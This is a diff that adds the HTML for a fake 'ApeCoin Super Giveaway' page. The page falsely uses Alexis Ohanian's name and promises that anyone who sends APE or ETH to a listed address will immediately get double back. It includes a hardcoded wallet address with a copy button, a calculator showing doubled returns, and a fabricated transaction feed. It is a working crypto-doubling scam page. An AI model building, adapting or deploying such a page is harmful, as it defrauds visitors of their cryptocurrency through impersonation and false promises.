@@ -1,0 +1,293 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="css/style.css">
+    <link rel="shortcut icon" href="img/head-bottom.png" type="image/x-icon">
+    <title>ApeCoin</title>
+</head>
+
+<body>
+    <div class="wrapper">
+        <nav class="nav">
+            <img src="img/logo.svg" alt="">
+            <ul class="nav-ul">
+                <a href="">
+                    <li class="nav-li">About</li>
+                </a>
+                <a href="">
+                    <li class="nav-li">Rules</li>
+                </a>
+                <a href="">
+                    <li class="nav-li">Participate</li>
+                </a>
+                <a href="">
+                    <li class="nav-li">Transaction's</li>
+                </a>
+            </ul>
+            <a href="#"><button class="nav-btn">Participate</button></a>
+        </nav>
+        <header class="header">
+            <img src="img/header-left-img.png" alt="" class="header-left-img">
+            <div class="header-text_block">
+                <div class="header-prise_text">
+                    <span class="prise_text-f">$5,000,000</span>
+                    <p class="prise_text-sec">Alexis Ohanian — CEO Event<img src="img/header-head.png" alt="head"></p>
+                </div>
+                <h1 class="text_block-h1">
+                    Super Giveaway<br>
+                    by <span>APECOIN</span>
+                </h1>
+                <div class="text-block_subtitle">
+                    $5,000,000 will be sent out to all lucky members.
+                </div>
+                <div class="text-block-btn">
+                    <a href="#"><button class="block-btn-f">Participate</button></a>
+                    <a href="#"><button class="block-btn-sec">Learn more</button></a>
+                </div>
+            </div>
+            <img src="img/header-right-img.png" alt="" class="header-right-img">
+            <img src="img/header-center-ing.png" alt="" class="header-center-img">
+        </header>
+        <div class="about-block">
+            <div class="about-block_prev">
+                <h1 class="block_prev-h">About<br>Giveaway</h1>
+                <p class="block_prev-p">
+                    We believe that APE & ETH will make the world more fair. To speed<br>
+                    up the process of cryptocurrency mass adoption, we decided to run<br>
+                    2.500.000 APE & 10.000 ETH giveaway for all crypto holdrs!
+                </p>
+            </div>
+            <div class="about-card_row">
+                <div class="card_col">
+                    <div class="card-num">01</div>
+                    <h1 class="card-h">About giveaway</h1>
+                    <p class="card-p">
+                        We believe that APE & ETH will make the <br>
+                        world more fair. To speed up the process of <br>
+                        cryptocurrency mass adoption, we decided to <br>
+                        run 2.500.000 APE & 10.000 ETH giveaway for <br>
+                        all crypto holdrs!
+                    </p>
+                </div>
+                <div class="card_col">
+                    <div class="card-num">02</div>
+                    <h1 class="card-h">How participate?</h1>
+                    <p class="card-p">
+                        To participate you just need to send from <br>
+                        (500 APE to 250.000 APE) or (1 ETH to 500 <br>
+                        ETH) to the contribution address and we <br>
+                        will immediately send you back (1000 APE to <br>
+                        500.000 ape) or (2 ETH to 1 000 ETH)
+                    </p>
+                </div>
+                <div class="card_col">
+                    <div class="card-num">03</div>
+                    <h1 class="card-h">Rules giveaway</h1>
+                    <p class="card-p">
+                        We believe that APE & ETH will make the <br>
+                        world more fair. To speed up the process of <br>
+                        cryptocurrency mass adoption, we decided to <br>
+                        run 2.500.000 APE & 10.000 ETH giveaway for <br>
+                        all crypto holdrs!
+                    </p>
+                </div>
+            </div>
+        </div>
+        <div class="profit-block">
+            <div class="profit-header-text_block">
+                <div class="header-prise_text">
+                    <span class="prise_text-f">$5,000,000</span>
+                    <p class="prise_text-sec">Alexis Ohanian — CEO Event<img src="img/header-head.png" alt="head"></p>
+                </div>
+                <h1 class="text_block-h1">
+                    Count your profit <br>
+                    thanks to the <br>
+                    calculator
+                </h1>
+                <div class="text-block_subtitle-sec">
+                    Calculate your income using our calculator, and participate.
+                </div>
+            </div>
+        </div>
+        <div class="adress-modal-window">
+            <img src="img/close-outline.svg" alt="close" onclick="modalClose()">
+            <h1>your address has been confirmed, waiting for your payment</h1>
+        </div>
+        <div class="modal-window-bg" onclick="modalBg()"></div>
+        <div class="last_Chance-block">
+            <div class="last_Chance-block-contact">
+                <div class="address-block">
+                    <h3>Enter your address</h3>
+                    <input type="text" placeholder="The bonus will be sent to the address" class="contact-input_adress">
+                    <button class="contact-btn-send" onclick="adressAlert()">Send</button>
+                    
+                    <div class="address-block-sec">
+                        <h3>Send to the following address</h3>
+                        <input id="bonus-input" type="text" value="17FbrQQkjQNZ5rrVLNga9VbmhwGK1hd7QM"
+                            class="contact-input_adress">
+                        <button class="contact-btn-copy" onclick="copy_button()">Copy</button>
+                    </div>
+                </div>
+            </div>
+            <div class="apecoin-block">
+                <h3>APECOIN</h3>
+                <div class="apecoin-block_send">
+                    <span class="apecoin-eth">ETH</span>
+                    <h3 class="block-send_h3">You will send</h3>
+                    <input type="number" class="calculator-apcoin-send" value="250" oninput="inputeApecoin()"
+                        maxlength="15">
+                </div>
+                <div class="apecoin-block_receive">
+                    <span class="apecoin-eth">ETH</span>
+                    <h3 class="block-send_h3">You will receive</h3>
+                    <h1 type="number" class="calculator-apcoin-receive">500 <img src="img/etereum.png" class="img-eter">
+                    </h1>
+                </div>
+            </div>
+            <div class="ethereum-block">
+                <h3>ETHEREUM</h3>
+                <div class="apecoin-block_send">
+                    <span class="apecoin-eth">ETH</span>
+                    <h3 class="block-send_h3">You will send</h3>
+                    <input type="number" class="calculator-etereum-send" value="250" oninput="inputeEter()" maxlength="4">
+                </div>
+                <div class="apecoin-block_receive">
+                    <span class="apecoin-eth">ETH</span>
+                    <h3 class="block-send_h3">You will receive</h3>
+                    <h1 type="number" class="calculator-etereum-receive">500 <img src="img/etereum.png" class="img-eter">
+                    </h1>
+                </div>
+            </div>
+        </div>
+        <div class="last_Chance-block-mobile">
+            <div class="last_Chance-block-contact">
+                <div class="address-block">
+                    <h3>Enter your address</h3>
+                    <input type="text" placeholder="The bonus will be sent to the address" class="contact-input_adress">
+                    <button class="contact-btn-send" onclick="adressAlert()">Send</button>
+                    
+                    <div class="address-block-sec">
+                        <h3>Send to the following address</h3>
+                        <input id="bonus-input2" type="text" value="17FbrQQkjQNZ5rrVLNga9VbmhwGK1hd7QM"
+                            class="contact-input_adress">
+                        <button class="contact-btn-copy" onclick="copy_button2()">Copy</button>
+                    </div>
+                </div>
+            </div>
+            <div class="apecoin-block">
+                <h3>APECOIN</h3>
+                <div class="apecoin-block_send">
+                    <span class="apecoin-eth">ETH</span>
+                    <h3 class="block-send_h3">You will send</h3>
+                    <input type="text" class="calculator-apcoin-send" value="250" oninput="inputeApecoin()"
+                        maxlength="15">
+                </div>
+                <div class="apecoin-block_receive">
+                    <span class="apecoin-eth">ETH</span>
+                    <h3 class="block-send_h3">You will receive</h3>
+                    <h1 type="text" class="calculator-apcoin-receive">500 <img src="img/etereum.png" class="img-eter">
+                    </h1>
+                </div>
+            </div>
+            <div class="ethereum-block">
+                <h3>ETHEREUM</h3>
+                <div class="apecoin-block_send">
+                    <span class="apecoin-eth">ETH</span>
+                    <h3 class="block-send_h3">You will send</h3>
+                    <input type="text" class="calculator-etereum-send" value="250" oninput="inputeEter()" maxlength="4">
+                </div>
+                <div class="apecoin-block_receive">
+                    <span class="apecoin-eth">ETH</span>
+                    <h3 class="block-send_h3">You will receive</h3>
+                    <h1 type="text" class="calculator-etereum-receive">500 <img src="img/etereum.png" class="img-eter">
+                    </h1>
+                </div>
+            </div>
+        </div>
+        <footer class="footer">
+            <div class="footer-head">
+                <div class="head-col hide">TxHash</div>
+                <div class="head-col hide">Block</div>
+                <div class="head-col from-f">From</div>
+                <div class="head-col from-s">From&To</div>
+                <div class="head-col hide">To</div>
+                <div class="head-col">Value</div>
+                <div class="head-col hide">Fee</div>
+                <div class="head-col">Age</div>
+            </div>
+            <div class="footer-history">
+                <div class="footer-history-col">
+                    <img src="img/checked-footer.png" alt="" class="checked-footer">
+                    <span class="history-col-text_TxHash hide">05b63h21g6...</span>
+                    <span class="history-col-text-number_block hide">395839</span>
+                    <div class="history-col-text_from">
+                        <span class="history-col-text_from_in">4cF48K...</span>
+                        <span class="history-col-text">7xEHtu9...</span>
+                    </div>
+                    <img src="img/checked-footer.png" alt="" class="checked-footer-sec">
+                    <div class="history-col-text_to">
+                        <span class="history-col-text_from_in">0xC48A...</span>
+                        <span class="history-col-text">0xC8tuX...</span>
+                    </div>
+                    <div class="history-col-text_value">
+                        <span class="history-col-text-border">72 APE</span>
+                        <span class="history-col-text">36 APE</span>
+                    </div>
+                    <span class="history-col-text history-col-text-fee hide">0.0000015</span>
+                    <span class="history-col-text_time">right now</span>
+                </div>
+                <div class="footer-history-col">
+                    <img src="img/checked-footer.png" alt="" class="checked-footer">
+                    <span class="history-col-text_TxHash hide">02d63301a6...</span>
+                    <span class="history-col-text-number_block hide">616732</span>
+                    <div class="history-col-text_from">
+                        <span class="history-col-text_from_in">0xC48A...</span>
+                        <span class="history-col-text">0xC8tuX...</span>
+                    </div>
+                    <img src="img/checked-footer.png" alt="" class="checked-footer-sec">
+                    <div class="history-col-text_to">
+                        <span class="history-col-text_from_in">0xC48A...</span>
+                        <span class="history-col-text">0xC8tuX...</span>
+                    </div>
+                    <div class="history-col-text_value">
+                        <span class="history-col-text-border">200 APE</span>
+                        <span class="history-col-text">100 APE</span>
+                    </div>
+                    <span class="history-col-text history-col-text-fee hide">0.0000065</span>
+                    <span class="history-col-text_time">right now</span>
+                </div>
+                <div class="footer-history-col">
+                    <img src="img/checked-footer.png" alt="" class="checked-footer">
+                    <span class="history-col-text_TxHash hide">17d656301b...</span>
+                    <span class="history-col-text-number_block hide">849375</span>
+                    <div class="history-col-text_from">
+                        <span class="history-col-text_from_in">3xC58J...</span>
+                        <span class="history-col-text">8xC3tuF...</span>
+                    </div>
+                    <img src="img/checked-footer.png" alt="" class="checked-footer-sec">
+                    <div class="history-col-text_to">
+                        <span class="history-col-text_from_in">0uC62I...</span>
+                        <span class="history-col-text">7gC8tkX...</span>
+                    </div>
+                    <div class="history-col-text_value">
+                        <span class="history-col-text-border">42 APE</span>
+                        <span class="history-col-text">21 APE</span>
+                    </div>
+                    <span class="history-col-text history-col-text-fee hide">0.0000047</span>
+                    <span class="history-col-text_time">right now</span>
+                </div>
+            </div>
+        </footer>
+    </div>
+    <script src="js/copy-btn.js"></script>
+    <script src="js/history.js"></script>
+    <script src="js/calculator.js"></script>
+    <script src="js/modal.js"></script>
+
+</body>
+
+</html>
